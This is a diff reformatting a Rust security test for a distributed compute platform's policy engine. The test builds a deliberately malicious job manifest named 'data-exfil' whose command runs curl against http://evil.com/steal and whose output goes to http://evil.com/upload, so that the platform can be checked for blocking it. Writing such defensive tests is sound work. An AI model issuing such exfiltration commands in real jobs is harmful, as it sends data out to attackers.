@@ -3,11 +3,11 @@
 //! Attack: Submit workloads designed to abuse the platform — egress to
 //! exfiltrate data, runtime code fetch, LAN scanning, unsigned artifacts.
 
+use std::net::{IpAddr, Ipv4Addr};
 use worldcompute::policy::decision::Verdict;
 use worldcompute::policy::engine::{evaluate, SubmissionContext};
 use worldcompute::policy::rules::{check_egress_allowlist, check_workload_class_with_quarantine};
 use worldcompute::sandbox::egress::{is_blocked_destination, EgressPolicy};
-use std::net::{IpAddr, Ipv4Addr};
 
 fn attacker_ctx() -> SubmissionContext {
     SubmissionContext {
@@ -20,23 +20,34 @@ fn attacker_ctx() -> SubmissionContext {
     }
 }
 
-fn malicious_manifest(egress_bytes: u64, sig: Vec<u8>) -> worldcompute::scheduler::manifest::JobManifest {
+fn malicious_manifest(
+    egress_bytes: u64,
+    sig: Vec<u8>,
+) -> worldcompute::scheduler::manifest::JobManifest {
     let cid = worldcompute::data_plane::cid_store::compute_cid(b"malicious payload").unwrap();
     worldcompute::scheduler::manifest::JobManifest {
-        manifest_cid: None, name: "data-exfil".into(),
+        manifest_cid: None,
+        name: "data-exfil".into(),
         workload_type: worldcompute::scheduler::WorkloadType::OciContainer,
-        workload_cid: cid, command: vec!["curl".into(), "http://evil.com/steal".into()],
-        inputs: Vec::new(), output_sink: "http://evil.com/upload".into(),
+        workload_cid: cid,
+        command: vec!["curl".into(), "http://evil.com/steal".into()],
+        inputs: Vec::new(),
+        output_sink: "http://evil.com/upload".into(),
         resources: worldcompute::scheduler::ResourceEnvelope {
-            cpu_millicores: 1000, ram_bytes: 512*1024*1024, gpu_class: None,
-            gpu_vram_bytes: 0, scratch_bytes: 1024*1024*1024,
-            network_egress_bytes: egress_bytes, walltime_budget_ms: 3_600_000,
+            cpu_millicores: 1000,
+            ram_bytes: 512 * 1024 * 1024,
+            gpu_class: None,
+            gpu_vram_bytes: 0,
+            scratch_bytes: 1024 * 1024 * 1024,
+            network_egress_bytes: egress_bytes,
+            walltime_budget_ms: 3_600_000,
         },
         category: worldcompute::scheduler::JobCategory::PublicGood,
         confidentiality: worldcompute::scheduler::ConfidentialityLevel::Public,
         verification: worldcompute::scheduler::VerificationMethod::ReplicatedQuorum,
         acceptable_use_classes: vec![worldcompute::acceptable_use::AcceptableUseClass::Scientific],
-        max_wallclock_ms: 3_600_000, submitter_signature: sig,
+        max_wallclock_ms: 3_600_000,
+        submitter_signature: sig,
     }
 }
 
